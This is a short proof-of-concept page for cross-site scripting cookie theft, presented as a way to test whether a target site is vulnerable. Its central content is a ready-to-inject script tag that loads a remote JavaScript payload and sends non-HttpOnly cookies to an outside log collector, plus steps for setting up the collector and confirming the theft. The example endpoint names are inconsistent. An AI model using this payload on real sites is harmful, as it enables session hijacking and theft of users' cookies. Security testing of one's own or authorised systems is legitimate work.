XSS Cookie Exfiltration Proof of Concept

Goal: Test if the target site allows arbitrary JavaScript execution (XSS) that can steal non-HttpOnly cookies and send them to a log collector.

Usage: 1. Create a Beeceptor endpoint (e.g., https://mytest.requestly.io). 2. Craft the **vulnerable link** on the target site to inject the following payload:

<script src="https://pipelock.dev/xss_payload.js?log=https://wh888868bd036c57cb0e.free.beeceptor.com"></script>
*Note: The script attempts to determine the log URL from its own source tag.*

Status: Waiting for payload to execute. Check your **Beeceptor log** for incoming data.

If you see a successful request with cookie data in your log, the XSS vulnerability is confirmed.
